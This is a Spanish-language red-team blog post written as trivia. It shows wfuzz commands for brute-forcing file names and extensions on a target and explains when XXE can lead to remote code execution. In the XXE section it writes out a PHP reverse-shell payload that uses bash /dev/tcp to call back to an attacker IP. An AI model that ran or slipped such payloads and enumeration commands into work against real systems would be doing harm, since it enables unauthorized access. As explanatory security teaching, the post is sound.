---
title: "Trivias Red Team para ser el alma de la fiesta"
description: "Divierte con tus amigos resolviendo incleibles trivias de Red Team"
date: "2025-12-04"
banner:
  src: "../../images/trivia.jpg"
  alt: "Really close pic of one eye"
  caption: 'Photo by <a href="https://unsplash.com/@axville">Axville</a> on Unsplash'
categories:
  - "Trivia"
  - "Games"
  - "Red Team"
keywords:
  - "Trivia"
  - "Games"
  - "Red Team"
---

> Consigue la extension Blue Team Trivias por solo un Bitcoin con BLACKFRIDAY%50! No esperes mas! Que se acaba!

# Red Team Trivias para ser el alma de la fiesta

## trivia: como haces para fuzzear con wfuzz `archivo.ext` usando una wordlist para nombres de archivos y otra para extensiones haciendo pasar las peticiones por burpsuite?

### Solucion:

`wfuzz -u http://target.vict/FUZZ.FUZ2Z -z file,wordlist.txt  -z file,extensions.txt --hc 404 -p 127.0.0.1:8080`

### Comentario: 

Si bien de este modo podriamos fuzzear archivo.ext para buscar vias potenciales de explotacion de un servidor, si el archivo de extensiones es muy grande se vuelve un poco ineficiente a mi modo de ver. Y por el tiempo que llevaria llegar a un archivo.ext util quiza cancelemos el proceso antes de llegar a el.
Por ello, seria mejor no pasar por alto el OS del servidor, y fuzzear archivos con una pequenia lista de extensiones basadas en el OS servidor. El comando que podriamos usar para ello seria el siguiente:

`wfuzz -u http://target.vict/FUZZ.FUZ2Z -w wordlist.txt -z list,asp-aspx --hc 404`





## trivia: Se puede lograr un RCE a traves de un XEE?

### Solucion:

Si y No, de que depende?

#### Porque No:

El parser XML solo trabaja a nivel texto, es simplemente una forma de acceder a datos, no de interpretarlos ni ejecutarlos.

El parser XML tiene la responsabilidad de resolver las entidades externas como texto y reemplaza el nodo donde va `&myEntity;`. 

Esto sucede cuando un parser mal configurado, con configuraciones por default inseguras, o cuando el parser es vulnerable perse y permite que el atacante defina entidades externas (`<!ENTITY>`)

Pero porque el wrapper PHP es interepretado si dijimos que el Parser XML no interpreta codigo? Porque el parser XML está dentro de una aplicación PHP, y utiliza funciones del sistema de archivos de PHP. Esto no es ejecución de código, es solo uso del sistema de archivos a través de los wrappers que PHP proporciona.

#### Porque Si:

Para lograr un RCE es necesaria una cadena de ataque, es decir, que un proceso o servicio posterior interprete una instruccion maliciosa nuestra de un modo tal que asi: `attckr -> XML Parser -> Svc_interprete`.
1. Por ejemplo, el siguiente caso no lograra un Reverse Shell ya que no hay un interprete perse `XXE SSRF http://attckr/revshell.php   ->   attckr$ python -m http.server 80 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.36/4040 0>&1'")?>`
2. El parser XML lee `revshell.php` pero no lo ejecuta por si mismo (per se), y al no haber tampoco una cadena en la cual el parser tras tomar este archivo lo pasa/inyecta en un segundo proceso/servicio que lo intereprete no es posible RCE to Reverse Shell.

### Conclusion: XXE puro solo como Exfiltracion de Datos

3. El parser XML no interpreta/ejecuta código.
4. Solo resuelve entidades como texto.
5. Solo accede a recursos disponibles mediante rutas o wrappers (file://, php://, etc.).
6. El RCE diseño inseguro del sistema.
7. El ataque ocurre porque el atacante puede definir entidades externas, gracias a esa mala configuración.

Para que XXE derive en RCE tendría que cumplir al menos una de estas condiciones:
1. El parser o la aplicación utiliza el contenido XML para deserializar objetos peligrosos.
2. El XML alimenta directamente un componente que interpreta comandos, como transformaciones XSLT inseguras.

